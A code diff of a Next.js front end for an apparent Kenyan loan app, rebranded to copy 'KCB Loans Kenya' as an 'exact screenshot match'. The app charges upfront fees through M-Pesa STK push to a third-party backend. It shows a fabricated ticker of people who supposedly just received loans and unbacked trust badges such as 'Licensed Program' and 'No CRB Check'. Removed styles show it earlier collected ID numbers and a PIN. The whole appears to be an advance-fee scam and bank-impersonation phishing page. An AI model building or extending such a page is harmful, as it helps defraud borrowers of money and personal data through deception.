@@ -1,29 +1,96 @@
 "use client";
 import { useState, useEffect, useRef } from "react";
 
+import {
+  FaBolt,
+  FaMobileAlt,
+  FaShieldAlt,
+  FaUser,
+  FaStar,
+  FaMoneyBillWave,
+  FaFileAlt,
+  FaCheckCircle,
+  FaLock
+} from "react-icons/fa";
 /* ═══════════════════════════════════════════════════════════════
-   KORO LOANS
-   Flow: Splash → Step1(name) → Step2(ID) → Step3(PIN) →
-         Step4(birth) → Step5(phone) → Step6(loan type) →
-         Dashboard (loan grid) → Confirm Modal → STK Modal → Success
-   Backend: https://payhero-backend-m78g.onrender.com
-   Theme: white bg · black buttons · green #22c55e accent
+   KCB LOANS KENYA — exact screenshot match
+   Landing → Eligibility Form → Loan Grid → Confirm Modal →
+   STK Push → Verifying Payment → Success
+   Real M-Pesa: starlink-backend-yb3n.onrender.com
 ═══════════════════════════════════════════════════════════════ */
 
 const MPESA_BASE = "https://payhero-backend-m78g.onrender.com";
 
-/* ── LOAN PACKAGES ────────────────────────────────────────────── */
-const LOANS = [
-  { amount: 10900,  fee: 10,  repayment: 11050  },
-  { amount: 15200,  fee: 200,  repayment: 15400  },
-  { amount: 20800,  fee: 290,  repayment: 21090  },
-  { amount: 25200,  fee: 350,  repayment: 25550  },
-  { amount: 30600,  fee: 450,  repayment: 31050  },
-  { amount: 40000,  fee: 550,  repayment: 40550  },
-  { amount: 50400,  fee: 680,  repayment: 51080  },
-  { amount: 60800,  fee: 1080, repayment: 61880  },
-  { amount: 70200,  fee: 1900, repayment: 72100  },
-  { amount: 80600,  fee: 2550, repayment: 83150  },
+/* ── Loan packages (amount, fee, repayment = amount + fee + interest) ── */
+const LOAN_GROUPS = [
+  {
+    title: "Personal Loan Loans",
+    items: [
+      { amount: 4000, fee: 199 },
+      { amount: 8000, fee: 213 },
+      { amount: 11000, fee: 293 },
+      { amount: 15000, fee: 449 },
+      { amount: 23000, fee: 612 },
+      { amount: 30000, fee: 799 },
+      { amount: 45000, fee: 1197 },
+    ],
+  },
+  {
+    title: "Business Loan Loans",
+    items: [
+      { amount: 13000, fee: 346 },
+      { amount: 25000, fee: 649 },
+      { amount: 38000, fee: 1011 },
+      { amount: 50000, fee: 1299 },
+      { amount: 75000, fee: 1799 },
+      { amount: 100000, fee: 2499 },
+      { amount: 150000, fee: 3990 },
+    ],
+  },
+  {
+    title: "Education Loan Loans",
+    items: [
+      { amount: 5000, fee: 199 },
+      { amount: 10000, fee: 349 },
+      { amount: 15000, fee: 449 },
+      { amount: 20000, fee: 549 },
+      { amount: 30000, fee: 799 },
+      { amount: 40000, fee: 999 },
+      { amount: 60000, fee: 1596 },
+    ],
+  },
+  {
+    title: "Emergency Loan Loans",
+    items: [
+      { amount: 3000, fee: 80 },
+      { amount: 5000, fee: 199 },
+      { amount: 8000, fee: 213 },
+      { amount: 10000, fee: 349 },
+      { amount: 15000, fee: 449 },
+      { amount: 20000, fee: 549 },
+      { amount: 30000, fee: 799 },
+    ],
+  },
+  {
+    title: "Home Improvement Loans",
+    items: [
+      { amount: 25000, fee: 649 },
+      { amount: 50000, fee: 1299 },
+      { amount: 75000, fee: 1799 },
+      { amount: 100000, fee: 2499 },
+      { amount: 150000, fee: 3990 },
+      { amount: 200000, fee: 5320 },
+      { amount: 300000, fee: 7980 },
+    ],
+  },
+];
+
+
+const SECURITY = [
+  { icon: FaLock, label: "SSL Secured" },
+  { icon: FaShieldAlt, label: "Data Protected" },
+  { icon: FaUser, label: "No CRB Check" },
+  { icon: FaStar, label: "Licensed Program" },
 ];
 
 const LOAN_TYPES = [
@@ -35,18 +102,7 @@ const LOAN_TYPES = [
   "Asset Finance",
 ];
 
-const RECENT = [
-  "0727****01 received Ksh 22,500 – 7 mins ago",
-  "0712****45 received Ksh 50,400 – 12 mins ago",
-  "0745****88 received Ksh 20,800 – 18 mins ago",
-  "0711****32 received Ksh 80,600 – 22 mins ago",
-  "0790****56 received Ksh 30,600 – 31 mins ago",
-  "0722****19 received Ksh 15,200 – 35 mins ago",
-  "0768****74 received Ksh 40,000 – 44 mins ago",
-  "0733****63 received Ksh 25,200 – 51 mins ago",
-];
-
-/* ── HELPERS ─────────────────────────────────────────────────── */
+/* ── phone helpers ── */
 function normalisePhone(raw) {
   const p = raw.replace(/\D/g, "");
   if (p.startsWith("07") || p.startsWith("01")) return "254" + p.slice(1);
@@ -60,1764 +116,1459 @@ function isValidPhone(raw) {
 function fmt(n) {
   return Number(n).toLocaleString("en-KE");
 }
+function maskPhone(p) {
+  const d = p.replace(/\D/g, "");
+  if (d.startsWith("254")) return "254" + d.slice(3, 6) + "***" + d.slice(-3);
+  return d.slice(0, 4) + "***" + d.slice(-3);
+}
+
+/* ── Recent loan ticker data ── */
+const RECENT = [
+  "0727****01 loaned Ksh 22,500 – 7 mins ago",
+  "0712****45 loaned Ksh 16,800 – 12 mins ago",
+  "0745****88 loaned Ksh 9,800 – 18 mins ago",
+  "0711****32 loaned Ksh 48,600 – 22 mins ago",
+  "0790****56 loaned Ksh 30,000 – 31 mins ago",
+  "0722****19 loaned Ksh 11,200 – 35 mins ago",
+  "0768****74 loaned Ksh 35,400 – 44 mins ago",
+  "0733****63 loaned Ksh 25,600 – 51 mins ago",
+];
 
 /* ══════════════════════════════════════════════════════════════
-   CSS
+   CSS — exact match to screenshots
 ══════════════════════════════════════════════════════════════ */
 const CSS = `
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{font-size:16px;-webkit-text-size-adjust:100%}
+body{font-family:'Inter',sans-serif;background:#f0f7f0;color:#1a1a1a;overflow-x:hidden;min-height:100vh;-webkit-font-smoothing:antialiased}
+input,select,button,textarea{font-family:inherit}
+input::placeholder{color:#b0b8b0}
+::-webkit-scrollbar{width:3px}::-webkit-scrollbar-thumb{background:#c8dfc8;border-radius:2px}
 
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { font-size: 16px; -webkit-text-size-adjust: 100%; }
+/* ── APP SHELL ── */
+.app{max-width:900px;margin:0 auto;min-height:100%;background:#f0f7f0;position:relative;overflow-x:hidden}
 
-body {
-  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-  background: #f5f5f5;
-  color: #111;
-  -webkit-font-smoothing: antialiased;
-  overflow-x: hidden;
-}
 
-input, button, select, textarea { font-family: inherit; }
-input::placeholder { color: #bbb; }
-button { cursor: pointer; }
-a { text-decoration: none; color: inherit; }
 
-/* ── PHONE SHELL ── */
-.shell {
-  min-height: 100vh;
-  max-width: 420px;
-  margin: 0 auto;
-  background: #fff;
-  display: flex;
-  flex-direction: column;
-  position: relative;
-  box-shadow: 0 0 40px rgba(0,0,0,.10);
+
+.hero-wrap{
+  display:flex;
+  gap:20px;
+  padding:24px 20px;
+  align-items:center;
+  justify-content:space-between;
 }
 
-/* ── TOP NAV BAR (steps) ── */
-.step-nav {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 16px 20px 12px;
-  border-bottom: 1px solid #f0f0f0;
-  flex-shrink: 0;
-}
-.step-back {
-  background: none;
-  border: none;
-  cursor: pointer;
-  font-size: 22px;
-  color: #111;
-  line-height: 1;
-  padding: 2px 4px;
-  display: flex;
-  align-items: center;
-}
-.step-chat {
-  font-size: 14px;
-  font-weight: 600;
-  color: #111;
-  background: none;
-  border: none;
-  cursor: pointer;
+.hero-left{
+  flex:1;
 }
 
-/* ── LOGO BLOCK ── */
-.logo-block {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  padding: 24px 20px 8px;
-}
-.koro-logo {
-  width: 72px;
-  height: 72px;
-  margin-bottom: 6px;
-}
-.koro-wordmark {
-  font-size: 1.55rem;
-  font-weight: 900;
-  letter-spacing: 0.28em;
-  color: #111;
-  text-transform: uppercase;
+.hero-title{
+  font-size:26px;
+  font-weight:800;
+  color:#1f3b73;
+  line-height:1.2;
 }
 
-/* ── STEP TITLE ── */
-.step-number {
-  font-size: 1.35rem;
-  font-weight: 800;
-  color: #111;
-  text-align: center;
-  padding: 20px 24px 0;
-  line-height: 1.25;
+.hero-title span{
+  color:#dc2626;
 }
 
-/* ── STEP BODY ── */
-.step-body {
-  flex: 1;
-  display: flex;
-  flex-direction: column;
-  padding: 20px 24px 32px;
-  gap: 0;
-}
-.step-instruction {
-  font-size: 1rem;
-  color: #111;
-  text-align: center;
-  line-height: 1.5;
-  margin-bottom: 6px;
-}
-.step-example-link {
-  font-size: 0.95rem;
-  color: #e53935;
-  text-align: center;
-  margin-bottom: 14px;
-  font-weight: 500;
+.hero-desc{
+  font-size:13px;
+  color:#6b7280;
+  margin:10px 0 14px;
 }
 
-/* ── ID CARD PREVIEW ── */
-.id-card-img {
-  width: 100%;
-  border-radius: 10px;
-  overflow: hidden;
-  margin-bottom: 20px;
-  border: 1px solid #e0e0e0;
-  background: #c8e6c9;
-  padding: 12px;
-  position: relative;
-}
-.id-card-inner {
-  background: #d4edda;
-  border-radius: 6px;
-  padding: 10px 12px;
-  font-size: 11px;
-  color: #1a3a1a;
-  line-height: 1.7;
-  position: relative;
-}
-.id-header {
-  display: flex;
-  justify-content: space-between;
-  font-weight: 700;
-  font-size: 10px;
-  margin-bottom: 8px;
-  color: #1a3a1a;
-}
-.id-row {
-  display: flex;
-  gap: 8px;
-  align-items: flex-start;
-}
-.id-photo {
-  width: 52px;
-  height: 64px;
-  background: #555;
-  border-radius: 3px;
-  flex-shrink: 0;
-  overflow: hidden;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-.id-photo svg {
-  width: 36px;
-  height: 36px;
-  fill: #aaa;
-}
-.id-details {
-  flex: 1;
-  font-size: 10px;
-  line-height: 1.8;
-  color: #1a3a1a;
-}
-.id-highlight {
-  display: inline-block;
-  background: transparent;
-  border: 2px solid #e53935;
-  border-radius: 3px;
-  padding: 0 3px;
-  font-weight: 700;
-}
-.id-highlight.name-hl {
-  display: block;
-  margin-top: 2px;
-}
-.id-stamp {
-  position: absolute;
-  right: 10px;
-  top: 50%;
-  transform: translateY(-50%) rotate(-15deg);
-  font-size: 22px;
-  font-weight: 900;
-  color: rgba(229,57,53,.35);
-  letter-spacing: -1px;
-  pointer-events: none;
-}
-.id-fingerprint {
-  position: absolute;
-  bottom: 8px;
-  right: 12px;
-}
-.id-fingerprint svg { width: 38px; height: 38px; opacity: .5; }
-
-/* ── PHONE RETURNING NOTICE ── */
-.returning-notice {
-  background: #22c55e;
-  color: #fff;
-  border-radius: 10px;
-  padding: 14px 16px;
-  font-size: 13px;
-  font-weight: 600;
-  line-height: 1.5;
-  margin-top: auto;
+.hero-steps{
+  display:flex;
+  gap:10px;
+  font-size:12px;
+  color:#374151;
+  margin-bottom:14px;
 }
 
-/* ── INPUTS ── */
-.inp-wrap {
-  margin-bottom: 16px;
-  position: relative;
-}
-.inp-label {
-  font-size: 11px;
-  font-weight: 600;
-  color: #888;
-  letter-spacing: .04em;
-  text-transform: uppercase;
-  margin-bottom: 5px;
-  display: block;
+.hero-steps div{
+  display:flex;
+  align-items:center;
+  gap:6px;
 }
 
-/* Outlined input like Koro screenshots */
-.koro-inp {
-  width: 100%;
-  border: 1.5px solid #ccc;
-  border-radius: 8px;
-  padding: 14px 16px;
-  font-size: 16px;
-  color: #111;
-  outline: none;
-  background: #fff;
-  transition: border-color .18s;
-}
-.koro-inp:focus { border-color: #22c55e; }
-.koro-inp.err   { border-color: #e53935; }
-
-/* Phone input with icon */
-.phone-inp-wrap {
-  border: 1.5px solid #ccc;
-  border-radius: 8px;
-  display: flex;
-  align-items: center;
-  overflow: hidden;
-  transition: border-color .18s;
-  background: #fff;
-}
-.phone-inp-wrap:focus-within { border-color: #22c55e; }
-.phone-inp-wrap.err           { border-color: #e53935; }
-.phone-icon {
-  padding: 14px 12px;
-  color: #888;
-  display: flex;
-  align-items: center;
-  flex-shrink: 0;
-}
-.phone-icon svg { width: 18px; height: 18px; stroke: #888; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
-.phone-inp {
-  flex: 1;
-  border: none;
-  padding: 14px 14px 14px 0;
-  font-size: 16px;
-  color: #111;
-  outline: none;
-  background: transparent;
+.hero-circle{
+  width:20px;
+  height:20px;
+  border-radius:50%;
+  background:#1f3b73;
+  color:#fff;
+  font-size:11px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
 }
 
-/* PIN input with eye */
-.pin-inp-wrap {
-  border: 1.5px solid #ccc;
-  border-radius: 8px;
-  display: flex;
-  align-items: center;
-  overflow: hidden;
-  transition: border-color .18s;
-  background: #fff;
-}
-.pin-inp-wrap:focus-within { border-color: #22c55e; }
-.pin-eye {
-  padding: 14px 12px;
-  color: #888;
-  display: flex;
-  align-items: center;
-  flex-shrink: 0;
-  cursor: pointer;
-}
-.pin-eye svg { width: 18px; height: 18px; stroke: #888; fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
-.pin-inp {
-  flex: 1;
-  border: none;
-  padding: 14px 14px 14px 0;
-  font-size: 16px;
-  color: #111;
-  outline: none;
-  background: transparent;
-  letter-spacing: 3px;
+.hero-btn{
+  background:#dc2626;
+  color:#fff;
+  border:none;
+  padding:12px 16px;
+  border-radius:8px;
+  font-weight:700;
+  cursor:pointer;
 }
 
-/* Select */
-.koro-sel {
-  width: 100%;
-  border: 1.5px solid #ccc;
-  border-radius: 8px;
-  padding: 14px 16px;
-  font-size: 16px;
-  color: #111;
-  outline: none;
-  background: #fff;
-  cursor: pointer;
-  appearance: none;
-  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
-  background-repeat: no-repeat;
-  background-position: right 14px center;
-  padding-right: 40px;
-  transition: border-color .18s;
-}
-.koro-sel:focus { border-color: #22c55e; }
-
-.ferr {
-  font-size: 12px;
-  color: #e53935;
-  margin-top: 4px;
+.hero-right{
+  flex:1;
+  max-width:360px;
 }
 
-/* ── BLACK CONTINUE / NEXT BUTTON ── */
-.btn-continue {
-  width: 100%;
-  padding: 18px;
-  border: none;
-  border-radius: 10px;
-  background: #111;
-  color: #fff;
-  font-size: 15px;
-  font-weight: 800;
-  letter-spacing: .1em;
-  text-transform: uppercase;
-  cursor: pointer;
-  transition: background .18s;
-  margin-top: auto;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
+.hero-img{
+  width:100%;
+  height:auto;
+  border-radius:16px;
 }
-.btn-continue:hover:not(:disabled) { background: #222; }
-.btn-continue:disabled { opacity: .45; cursor: not-allowed; }
 
-/* ── GREEN CTA BUTTON (splash) ── */
-.btn-green {
-  width: 100%;
-  padding: 18px;
-  border: none;
-  border-radius: 10px;
-  background: #22c55e;
-  color: #fff;
-  font-size: 15px;
-  font-weight: 800;
-  letter-spacing: .08em;
-  text-transform: uppercase;
-  cursor: pointer;
-  transition: background .18s;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
+.hero-stats{
+  position:absolute;
+  bottom:10px;
+  left:10px;
+  right:10px;
+  background:#fff;
+  border-radius:12px;
+  display:flex;
+  justify-content:space-between;
+  padding:10px;
+  font-size:12px;
+  box-shadow:0 4px 10px rgba(0,0,0,0.1);
 }
-.btn-green:hover { background: #16a34a; }
-.btn-green:disabled { opacity: .45; cursor: not-allowed; }
+
+.hero-stat strong{
+  display:block;
+  font-size:14px;
+}
+
+
+
+
+
+
+
+
+
+
+:root {
+  --primary-blue: #1e3a8a;
+  --light-blue: #eaf1fb;
+  --danger-red: #dc2626;
+  --accent-orange: #f59e0b;
+  --success-green: #22c55e;
+  --bg-main: #f8fafc;
+}
+
+/* ── TOP BAR ── */
+.topbar{background:linear-gradient(135deg,#1a7a3a,#2d9e52);padding:16px 20px 14px;display:flex;align-items:center;justify-content:space-between}
+.logo-pill{background:#fff;border-radius:12px;padding:8px 18px;display:inline-block}
+.logo-text{font-size:1.3rem;font-weight:800;color:#1a7a3a;letter-spacing:-.3px}
+.logo-reg{font-size:9px;vertical-align:super;color:#1a7a3a}
+.topbar-tag{background:rgba(255,255,255,.18);border-radius:99px;padding:6px 14px;font-size:12px;font-weight:600;color:#fff;display:flex;align-items:center;gap:5px}
+
+/* ── HERO CARD ── */
+.hero-card{margin:16px;background:#fff;border-radius:20px;padding:28px 24px;box-shadow:0 4px 24px rgba(26,122,58,.10)}
+.hero-avail{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.12em;color:#9aaa9a;text-align:center;margin-bottom:8px}
+.hero-amount{font-size:2.6rem;font-weight:800;color:#1a7a3a;text-align:center;line-height:1.1;margin-bottom:6px}
+.hero-dash{color:#333;font-weight:700}
+.hero-sub{text-align:center;font-size:13px;color:#6b7b6b;margin-bottom:22px;line-height:1.5}
+.features-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:0}
+.feat-box{background:#edf7ef;border-radius:14px;padding:18px 14px;display:flex;flex-direction:column;align-items:center;gap:8px;text-align:center}
+.feat-icon{font-size:26px;color:#1a7a3a}
+.feat-label{font-size:12px;font-weight:700;color:#2a3a2a}
+
+/* ── TRUST BADGES ── */
+.trust-row{display:flex;gap:8px;flex-wrap:wrap;padding:0 16px;margin-bottom:8px;justify-content:center}
+.trust-pill{background:#fff;border-radius:99px;padding:7px 14px;font-size:11px;font-weight:600;color:#2a4a2a;display:flex;align-items:center;gap:5px;box-shadow:0 2px 8px rgba(0,0,0,.06);border:1px solid #d8edd8}
+
+/* ── TICKER ── */
+.ticker-wrap{background:#edf7ef;border-radius:12px;margin:10px 16px;padding:10px 14px;display:flex;align-items:center;gap:8px;overflow:hidden}
+.ticker-icon{font-size:14px;flex-shrink:0;color:#1a7a3a}
+.ticker-text{font-size:12px;font-weight:600;color:#2a5a2a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+
+/* ── BTN PRIMARY ── */
+.btn-primary{display:block;width:calc(100% - 32px);margin:14px 16px;padding:18px;border-radius:14px;border:none;background:linear-gradient(135deg,#1a7a3a,#2d9e52);color:#fff;font-size:17px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s;box-shadow:0 6px 20px rgba(26,122,58,.3)}
+.btn-primary:hover{background:linear-gradient(135deg,#145f2e,#248042);transform:translateY(-1px)}
+.btn-primary:active{transform:translateY(0)}
+.btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none}
+.btn-primary-fixed{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;padding:18px 24px;border:none;background:linear-gradient(135deg,#1a7a3a,#2d9e52);color:#fff;font-size:17px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s;box-shadow:0 -4px 24px rgba(26,122,58,.2);z-index:20}
+.btn-primary-fixed:disabled{opacity:.5;cursor:not-allowed}
+
+/* ── FORM ── */
+.form-wrap{margin:0 16px;background:#fff;border-radius:20px;padding:24px;box-shadow:0 4px 20px rgba(26,122,58,.08)}
+.form-title{font-size:1.35rem;font-weight:800;color:#1a1a1a;text-align:center;margin-bottom:4px;line-height:1.25}
+.form-sub{font-size:13px;color:#7a8a7a;text-align:center;margin-bottom:4px}
+.form-range{font-size:15px;font-weight:800;color:#1a7a3a;text-align:center;margin-bottom:22px}
+.finp{width:100%;background:#f8faf8;border:1.5px solid #e0ece0;border-radius:14px;padding:15px 16px;font-size:15px;color:#1a1a1a;outline:none;transition:border-color .18s,box-shadow .18s;margin-bottom:12px}
+.finp:focus{border-color:#1a7a3a;box-shadow:0 0 0 3px rgba(26,122,58,.10)}
+.finp.err{border-color:#e53935}
+.fsel{width:100%;background:#f8faf8;border:1.5px solid #e0ece0;border-radius:14px;padding:15px 16px;font-size:15px;color:#1a1a1a;outline:none;cursor:pointer;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%231a7a3a' stroke-width='2'%3E%3Cpath d='m6 9 6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:40px;transition:border-color .18s;margin-bottom:12px}
+.fsel:focus{border-color:#1a7a3a;box-shadow:0 0 0 3px rgba(26,122,58,.10)}
+.ferr{font-size:11px;color:#e53935;margin:-8px 0 10px 4px}
+.finp-hint{font-size:11px;color:#9aaa9a;margin:-8px 0 10px 4px}
+.trust-mini{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:20px;justify-content:center}
+.trust-mini-pill{background:#edf7ef;border-radius:99px;padding:5px 12px;font-size:10px;font-weight:600;color:#2a5a2a;display:flex;align-items:center;gap:4px;border:1px solid #c8e4c8}
+.form-bottom-note{font-size:12px;color:#9aaa9a;text-align:center;margin-top:4px}
+
+
+
+
+
+.loader-circle {
+  width: 70px;
+  height: 70px;
+  border: 6px solid rgba(255,255,255,0.2);
+  border-top-color: #22c55e;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* ── LOAN GRID ── */
+.screen-title{font-size:1.15rem;font-weight:800;color:#1a7a3a;text-align:center;margin:16px 0 12px;padding:0 16px}
+.loan-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 16px;margin-bottom:90px}
+.loan-card{background:#fff;border:1.5px solid #e8f4e8;border-radius:16px;padding:18px 14px;cursor:pointer;transition:all .18s;display:flex;flex-direction:column;align-items:flex-start;gap:3px;position:relative;overflow:hidden}
+.loan-card:hover{border-color:#1a7a3a;transform:translateY(-2px);box-shadow:0 8px 24px rgba(26,122,58,.14)}
+.loan-card.selected{border-color:#1a7a3a;background:#edf7ef;box-shadow:0 6px 20px rgba(26,122,58,.18)}
+.loan-card.selected::before{content:'✓';position:absolute;top:8px;right:10px;font-size:13px;font-weight:800;color:#1a7a3a}
+.loan-amount{font-size:1.15rem;font-weight:800;color:#1a7a3a}
+.loan-fee{font-size:12px;color:#7a8a7a;font-weight:500}
+
+/* ── MODAL OVERLAY ── */
+.modal-bg{position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.45);backdrop-filter:blur(3px);display:flex;align-items:flex-end;justify-content:center;padding:0;animation:bgIn .25s ease}
+@media(min-width:480px){.modal-bg{align-items:center;padding:20px}}
+@keyframes bgIn{from{opacity:0}to{opacity:1}}
+.modal-box{background:#fff;border-radius:24px 24px 0 0;width:100%;max-width:480px;padding:28px 24px 36px;animation:slideUp .3s cubic-bezier(.34,1.2,.64,1)}
+@media(min-width:480px){.modal-box{border-radius:24px}}
+@keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:none;opacity:1}}
+.modal-icon{width:72px;height:72px;border-radius:50%;background:#edf7ef;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:36px}
+.modal-icon.doc{background:#edf7ef}
+.modal-icon.phone{background:#edf7ef}
+.modal-title{font-size:1.3rem;font-weight:800;color:#1a7a3a;text-align:center;margin-bottom:20px}
+.modal-details{background:#f8faf8;border-radius:14px;padding:16px;margin-bottom:16px}
+.modal-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #eef4ee}
+.modal-row:last-child{border-bottom:none}
+.modal-row-key{font-size:13px;color:#7a8a7a;font-weight:500}
+.modal-row-val{font-size:14px;font-weight:700;color:#1a1a1a}
+.modal-row-val.green{color:#1a7a3a}
+.modal-phone-line{font-size:13px;color:#7a8a7a;text-align:center;margin-bottom:6px}
+.modal-phone-num{font-size:16px;font-weight:700;color:#1a7a3a;text-align:center;margin-bottom:20px}
+.btn-proceed{width:100%;padding:17px;border-radius:14px;border:none;background:linear-gradient(135deg,#1a7a3a,#2d9e52);color:#fff;font-size:16px;font-weight:700;cursor:pointer;margin-bottom:12px;transition:all .2s;box-shadow:0 4px 16px rgba(26,122,58,.25)}
+.btn-proceed:hover{background:linear-gradient(135deg,#145f2e,#248042)}
+.btn-proceed:disabled{opacity:.5;cursor:not-allowed;transform:none}
+.btn-cancel{width:100%;padding:15px;border-radius:14px;border:1.5px solid #e0ece0;background:#fff;color:#7a8a7a;font-size:15px;font-weight:600;cursor:pointer;transition:all .2s}
+.btn-cancel:hover{border-color:#1a7a3a;color:#1a7a3a}
+
+/* ── STK SCREEN ── */
+.stk-modal-icon{font-size:58px;margin-bottom:6px}
+.stk-title{font-size:1.3rem;font-weight:800;color:#1a7a3a;text-align:center;margin-bottom:14px}
+.stk-phone-box{background:#f0f7f0;border-radius:10px;padding:10px 16px;text-align:center;margin-bottom:20px;font-size:14px;color:#2a5a2a;font-weight:600}
+.stk-verifying{text-align:center;font-size:15px;font-weight:700;color:#1a1a1a;margin-bottom:4px}
+.stk-dots{display:inline-block;min-width:20px;text-align:left}
+.stk-bar-wrap{height:5px;background:#e0ece0;border-radius:99px;margin:16px 0;overflow:hidden}
+.stk-bar-fill{height:100%;background:linear-gradient(90deg,#1a7a3a,#4ade80);border-radius:99px;animation:stk-progress 20s linear forwards}
+@keyframes stk-progress{from{width:0%}to{width:95%}}
+.stk-note{font-size:12px;color:#9aaa9a;text-align:center;line-height:1.6}
+.stk-manual{margin-top:16px;background:none;border:none;cursor:pointer;font-size:12px;color:#9aaa9a;text-decoration:underline;display:block;margin:14px auto 0}
+
+/* ── SUCCESS ── */
+.success-wrap{padding:32px 24px;text-align:center}
+.success-icon{font-size:72px;margin-bottom:16px;animation:popIn .5s cubic-bezier(.34,1.56,.64,1)}
+@keyframes popIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+.success-title{font-size:1.5rem;font-weight:800;color:#1a7a3a;margin-bottom:8px}
+.success-sub{font-size:14px;color:#6b7b6b;line-height:1.7;max-width:300px;margin:0 auto 24px}
+.success-amount-box{background:#edf7ef;border:1.5px solid #a8d4a8;border-radius:16px;padding:20px;margin-bottom:20px}
+.success-amount{font-size:2rem;font-weight:800;color:#1a7a3a}
+.success-amount-sub{font-size:13px;color:#6b7b6b;margin-top:4px}
+.success-details{text-align:left;background:#f8faf8;border-radius:14px;padding:16px}
+.srow{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #eef4ee;font-size:13px}
+.srow:last-child{border-bottom:none}
+.srow-k{color:#9aaa9a;font-weight:500}
+.srow-v{color:#1a1a1a;font-weight:700}
+
+/* ── TIMEOUT ── */
+.timeout-wrap{text-align:center;padding:8px 0}
+.timeout-ico{font-size:52px;margin-bottom:12px}
+.timeout-t{font-size:1.1rem;font-weight:800;color:#1a1a1a;margin-bottom:8px}
+.timeout-s{font-size:13px;color:#7a8a7a;line-height:1.65;margin-bottom:20px}
+.btn-yes{width:100%;padding:15px;border-radius:12px;border:none;background:#1a7a3a;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:8px}
+.btn-no{width:100%;padding:15px;border-radius:12px;border:1.5px solid #e0ece0;background:#fff;color:#7a8a7a;font-size:14px;font-weight:600;cursor:pointer}
+
+/* ── SECURITY STRIP ── */
+.security-strip{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;padding:10px 16px 20px}
+.sec-pill{background:#fff;border-radius:99px;padding:7px 14px;font-size:11px;font-weight:600;color:#2a4a2a;display:flex;align-items:center;gap:5px;border:1px solid #d8edd8;box-shadow:0 1px 4px rgba(0,0,0,.05)}
 
 /* ── SPINNER ── */
-.spin-sm {
-  width: 16px;
-  height: 16px;
-  border: 2.5px solid rgba(255,255,255,.3);
-  border-top-color: #fff;
-  border-radius: 50%;
-  animation: sp .65s linear infinite;
-  display: inline-block;
-}
-@keyframes sp { to { transform: rotate(360deg); } }
+.spin{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .65s linear infinite;display:inline-block}
+@keyframes sp{to{transform:rotate(360deg)}}
 
-/* ══════════════════════════════════════════════════
-   SPLASH / LANDING
-══════════════════════════════════════════════════ */
-.splash {
-  flex: 1;
-  display: flex;
-  flex-direction: column;
-  position: relative;
-  overflow: hidden;
-  min-height: 100vh;
-}
-.splash-bg {
-  position: absolute;
-  inset: 0;
-  background: linear-gradient(to bottom, rgba(0,0,0,.45) 0%, rgba(0,0,0,.6) 100%);
-  z-index: 1;
-}
-.splash-bg-img {
-  position: absolute;
-  inset: 0;
-  background: url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?w=600&q=80') center/cover no-repeat;
-  z-index: 0;
-}
-.splash-content {
-  position: relative;
-  z-index: 2;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  padding: 40px 24px 0;
-  flex: 1;
-}
-.splash-logo-text {
-  font-size: 1.7rem;
-  font-weight: 900;
-  letter-spacing: .28em;
-  color: #fff;
-  margin-top: 8px;
-}
-.koro-logo-white { filter: brightness(10); }
-.splash-headline {
-  margin-top: 28px;
-  font-size: 1.75rem;
-  font-weight: 900;
-  color: #fff;
-  line-height: 1.15;
-  text-align: center;
-  letter-spacing: .01em;
-}
-.splash-headline em {
-  color: #22c55e;
-  font-style: normal;
-}
-.splash-bottom {
-  position: relative;
-  z-index: 2;
-  padding: 20px 24px 36px;
-  display: flex;
-  flex-direction: column;
-  gap: 14px;
-}
-.splash-terms {
-  font-size: 13px;
-  color: rgba(255,255,255,.75);
-  text-align: center;
-  line-height: 1.5;
-}
-.splash-terms a {
-  color: rgba(255,255,255,.9);
-  text-decoration: underline;
-}
-.splash-legal {
-  font-size: 11px;
-  color: rgba(255,255,255,.5);
-  text-align: center;
-  line-height: 1.6;
-}
-
